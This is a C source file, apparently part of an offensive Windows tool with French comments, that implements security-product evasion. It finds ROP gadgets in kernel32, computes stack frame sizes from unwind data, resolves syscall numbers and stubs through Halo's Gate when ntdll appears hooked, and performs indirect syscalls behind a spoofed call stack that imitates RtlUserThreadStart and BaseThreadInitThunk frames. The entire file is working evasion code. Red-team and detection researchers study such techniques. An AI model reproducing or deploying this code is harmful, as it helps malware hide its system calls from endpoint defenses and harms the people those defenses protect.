#include "..\helper.h"

#include "StealthCall.h"


PVOID FindJMPGadget(HMODULE hModule) {
    // Gadget: FF 23 -> jmp QWORD PTR [rbx]

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(hModule + dos->e_lfanew);

    DWORD textRva  = nt->OptionalHeader.BaseOfCode;
    DWORD textSize = nt->OptionalHeader.SizeOfCode;

    PBYTE text = (PBYTE)(hModule + textRva);

    for (DWORD i = 0; i < textSize - 1; i++)
    {
        if (text[i] == 0xFF && text[i + 1] == 0x23)
        {
            PVOID gadget = &text[i];
            ////printf("[*] Found ROP gadget (FF 23) @ %p\n", gadget);
            return gadget;
        }
    }

    return NULL;
}

DWORD getStackFrameSize(PVOID funcPTR, HMODULE modulePTR) {
    UINT64 pExceptionDirectory;
	DWORD dwRuntimeFunctionCount;
    DWORD dwFuncOffset;

    PUNWIND_INFO pUnwindInfo;
	PUNWIND_CODE pUnwindCode;
	UINT64 dwStackSize = 0;

    UINT64 pImgNtHdr;
    PIMAGE_OPTIONAL_HEADER64 pImgOptHdr;
    
    //printf("[*] Reading module image for Ntheader -> OptionalHeader \n");
    pImgNtHdr = (UINT64)modulePTR + ((PIMAGE_DOS_HEADER)modulePTR)->e_lfanew;
	pImgOptHdr = &((PIMAGE_NT_HEADERS64)pImgNtHdr)->OptionalHeader;

    pExceptionDirectory = (UINT64)modulePTR + pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress; //section .PDATA addr
	//printf("[*] Section .PDATA (OptionalHeader[ExceptionDirectory] -> PRUNTIME_FUNCTION table) @ 0x%p\n", pExceptionDirectory);
    dwRuntimeFunctionCount = pImgOptHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(RUNTIME_FUNCTION); // Count of runtime_function in .PDATA section
    //printf("[*] PRUNTIME_FUNCTION table has %d entries\n", dwRuntimeFunctionCount);
    dwFuncOffset = (UINT64)funcPTR - (UINT64)modulePTR;
    //printf("[*] Searching in PRUNTIME_FUNCTION entries for function @ 0x%p\n", funcPTR);

    PRUNTIME_FUNCTION pRuntimeFunction = (PRUNTIME_FUNCTION)pExceptionDirectory;
    BOOL bFound = FALSE;

    for (int i = 0 ; i < dwRuntimeFunctionCount; i++ ) {
        if (dwFuncOffset >= pRuntimeFunction->BeginAddress && dwFuncOffset <= pRuntimeFunction->EndAddress) {
            //printf("[*] Found entry !\n");
            bFound = TRUE;
			break;
		}

		pRuntimeFunction++;
    }
    if (!bFound) {
        //printf("[*] Unwind data not found for 0x%p. Defaulting frame size to 0x20.\n", funcPTR);
        return 0x20; // Taille standard (Shadow Space)
    }

    //pUnwindInfo = ((PUNWIND_INFO)(modulePTR + pRuntimeFunction->UnwindInfoAddress));
    pUnwindInfo = (PUNWIND_INFO)((UINT64)modulePTR + pRuntimeFunction->UnwindData);
    pUnwindCode = pUnwindInfo->UnwindCode;
    //printf("[*] Parsing UNWIND_INFO struct for UNWIND_CODE of Spoofed function prelude\n");

    /*
        Parse UNWIND_CODE entries to reconstruct the total stack allocation performed in the function prologue (simulate RtlVirtualUnwind logic).
        We accumulate stack size based on UWOP_* operations.
        More about UNWIND_CODES : learn.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-170#unwind-operation-code
    */
    for (int i = 0; i < pUnwindInfo->CountOfUnwindCodes; i++) {
        PUNWIND_CODE code = &pUnwindCode[i];
        BYTE op = code->UnwindOp;
        BYTE info = code->OpInfo;

        switch (op) {
            case UWOP_ALLOC_SMALL:
                dwStackSize += (info + 1) * 8;
                break;

            case UWOP_ALLOC_LARGE:
                if (info == 0) {
                    // Consomme 1 slot supplémentaire (16 bits)
                    dwStackSize += (pUnwindCode[i + 1].FrameOffset) * 8;
                    i += 1;
                } else {
                    // Consomme 2 slots supplémentaires (32 bits)
                    // On combine les deux entrées suivantes pour obtenir le DWORD
                    dwStackSize += *(DWORD*)&pUnwindCode[i + 1];
                    i += 2;
                }
                break;

            case UWOP_PUSH_NONVOL:
                dwStackSize += 8;
                break;

            case UWOP_PUSH_MACHFRAME:
                dwStackSize += (info == 0) ? 40 : 48;
                break;

            case UWOP_SET_FPREG:
                // ATTENTION: Si RSP est ancré sur RBP (Frame Pointer), 
                // le calcul statique s'arrête ici car la stack devient dynamique.
                // Pour du spoofing, on évite généralement de spoofer ces fonctions.
                break;

            case UWOP_SAVE_NONVOL:
                i += 1; // Skip slot d'offset
                break;

            case UWOP_SAVE_NONVOL_FAR:
                i += 2; // Skip slots d'offset
                break;
                
            case UWOP_SAVE_XMM128:
                i += 1;
                break;

            case UWOP_SAVE_XMM128_FAR:
                i += 2;
                break;
        }
    }
    //printf("[*] Stack frame is %llu bytes !\n", dwStackSize);
	return dwStackSize;
}

LPVOID Halo_gate(HMODULE hNtdll){
    LPVOID stub = NULL;
    BYTE* textBase = NULL;
    DWORD textSize = 0;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            textBase = (BYTE*)hNtdll + sec->VirtualAddress;
            textSize = sec->Misc.VirtualSize;
            break;
        }
    }

    BYTE* looker = textBase;
    for (int _ = 0; _ < textSize; _++) {
        looker++;
        if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xB8) {
            //stub normal => on trouve "syscall" (0x0F 0x05)
            if (looker[0x12] == 0x0F && looker[0x13] == 0x05) {
                stub = looker + 0x12; // direct vers le syscall
                //printf("\t[*] Found syscall with Halo's gate [0F 05] !\n");
                break;
            }
        }
    }

    return stub;
}

DWORD dynamicSSN_retreive(BYTE* NtFunctionAddr) {
    DWORD SSN = 0;
    int lookerField = 0x500;   // fenêtre de scan en arrière (bytes)
    int steps = 0;

    if (!NtFunctionAddr) return 0;

    // Sécuriser les bornes de lecture (rester dans la même région mémoire)
    MEMORY_BASIC_INFORMATION mbi;
    if (!VirtualQuery(NtFunctionAddr, &mbi, sizeof(mbi))) return 0;
    BYTE* regionBase = (BYTE*)mbi.BaseAddress;
    BYTE* regionEnd  = (BYTE*)mbi.BaseAddress + mbi.RegionSize;

    BYTE* lowerBound = NtFunctionAddr - lookerField;
    if (lowerBound < regionBase) lowerBound = regionBase;

    BYTE* looker = NtFunctionAddr;

    while (looker >= lowerBound) {
        // On s'assure qu'on peut lire au moins les 8 bytes (signature + imm32)
        // (Qu'on reste bien dans la meme région)
        if (looker + 7 >= regionEnd) {
            looker--; 
            continue;
        }

        // stub clean: 4C 8B D1 B8 xx xx xx xx (mov r10, rcx; mov eax, imm32)
        if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xB8) {
            SSN = (*(DWORD*)(looker + 4)) + (DWORD)steps;
            //printf("\t[*] yaay found SSN : 0x%x w/ %d steps\n", SSN, steps);
            break;
        }

        // stub hooké "jmp rel32": 4C 8B D1 E9 ....
        if (looker[0] == 0x4C && looker[1] == 0x8B && looker[2] == 0xD1 && looker[3] == 0xE9) {
            steps++;
        }

        looker--;
    }

    return SSN;
}

DWORD getInDirectSyscallStub(HMODULE hNTDLL, const char* NtFunctionName, DWORD *funcSSN, PVOID *ppTarget){
    DWORD SSN = 0;
    LPVOID stub = NULL;
    BYTE* NtFunctionAddr = (BYTE*)CustomGetProcAddress(hNTDLL, NtFunctionName);

    if (!NtFunctionAddr) return SSN;
    //Case si on a le SSN mais pas le syscall
    if (NtFunctionAddr[0] == 0x4C && NtFunctionAddr[1] == 0x8B && NtFunctionAddr[2] == 0xD1 && NtFunctionAddr[3] == 0xB8) {
        //printf("[+] Function %s @ 0x%p\n", NtFunctionName, NtFunctionAddr);
        SSN = *(DWORD*)((BYTE*)NtFunctionAddr + 4);

        // stub normal => on trouve "syscall" (0x0F 0x05)
        if (NtFunctionAddr[0x12] == 0x0F && NtFunctionAddr[0x13] == 0x05) {
            stub = NtFunctionAddr+0x12; // direct vers le syscall
            //printf("\t[*] Found syscall [0F 05] !\n");
        } else {
            //printf("[*] %s may be hooked by a security!\n", NtFunctionName);
            //printf("[*] Let's do a magic trick!\n");
            stub = Halo_gate(hNTDLL);
             
        }
    //case si on a pas de SSN (on aura pas de syscall non plus lol)
    } else { 
        //printf("[-] Unexpected stub format for %s!\n", NtFunctionName);
        //printf("[-] SSN not found!\n");
        //printf("[-] Trying dynamic SSN retrival\n");
        SSN = dynamicSSN_retreive(NtFunctionAddr);
        stub = Halo_gate(hNTDLL);
    }

    //printf("\t[+] %s stub : SSN 0x%x\n", NtFunctionName, SSN);
    //printf("\t[+] %s stub : syscall @ 0x%p\n", NtFunctionName, stub);

    *funcSSN = SSN;
    *ppTarget = stub;
    return SSN;
}

ULONG StealthCall(DWORD funcSSN, PVOID pTarget, DWORD dwNumberOfArgs, ...){
    va_list additionalArgs;

    PSTACK_CONFIG stackConfig = malloc(sizeof(STACK_CONFIG));
    memset(stackConfig, 0, sizeof(STACK_CONFIG));

    PVOID pGadget, pRtlUserThreadStart, pBaseThreadInitThunk;
	HMODULE pNtdll, pKernel32;

	pNtdll = CustomGetModuleHandleW(L"ntdll");
	pKernel32 = CustomGetModuleHandleW(L"kernel32");

	pRtlUserThreadStart = CustomGetProcAddress(pNtdll, "RtlUserThreadStart");
	pBaseThreadInitThunk = CustomGetProcAddress(pKernel32, "BaseThreadInitThunk");

    //printf("[*] Got RtlUserThreadStart from ntdll.dll @ 0x%p\n", pRtlUserThreadStart);
    //printf("[*] Got BaseThreadInitThunk from kernel32.dll @ 0x%p\n", pBaseThreadInitThunk);
    pGadget = FindJMPGadget(pKernel32);

    stackConfig->pRopGadget             = pGadget;
    stackConfig->pSpoofed1_ret          = (PVOID)((UINT64)pRtlUserThreadStart + 0x31);   //Getting a random point in the function to fake the ret of the spoofed frame
    stackConfig->Spoofed1StackSize      = getStackFrameSize(pRtlUserThreadStart, pNtdll);
    stackConfig->pSpoofed2_ret          = (PVOID)((UINT64)pBaseThreadInitThunk + 0x20); //Same random point
    stackConfig->Spoofed2StackSize      = getStackFrameSize(pBaseThreadInitThunk, pKernel32);
    stackConfig->SpoofedGadgetSize      = getStackFrameSize(pGadget, pKernel32);
    stackConfig->ssn                    = funcSSN;

    stackConfig->dwNumberOfArgs         = (dwNumberOfArgs > 4) ? dwNumberOfArgs : 4;
    stackConfig->pTarget = pTarget;
    //printf("[*] stackConfig->pTarget set to 0x%p\n", stackConfig->pTarget);

    stackConfig->pArgs = malloc(8 * stackConfig->dwNumberOfArgs); //allocate 8 bytes time number of args
    //printf("[*] Allocating %d bytes for %d args\n", (8 * stackConfig->dwNumberOfArgs), stackConfig->dwNumberOfArgs);
    memset(stackConfig->pArgs, 0, 8 * stackConfig->dwNumberOfArgs);
    
    //Say that there is more argument to our function w/ DWORD dwNumberOfArgs
    va_start(additionalArgs, dwNumberOfArgs); //make additianlArgs point to the stack after DWORD dwNumberOfArgs and can be pop
    for (int i = 0; i < dwNumberOfArgs; i++){
        UINT64 argValue = va_arg(additionalArgs, UINT64);
        ((PUINT64)stackConfig->pArgs)[i] = argValue;
        //printf("\t[Arg %d] Value: 0x%016llX\n", i, (unsigned long long)argValue);
    }
    va_end(additionalArgs);

    //printf("[*] Performing the call spoofed !\n");    
    ULONG status = (ULONG)(ULONG_PTR)SpoofCall(stackConfig);

    free(stackConfig->pArgs);
    free(stackConfig);
    return status;
    
}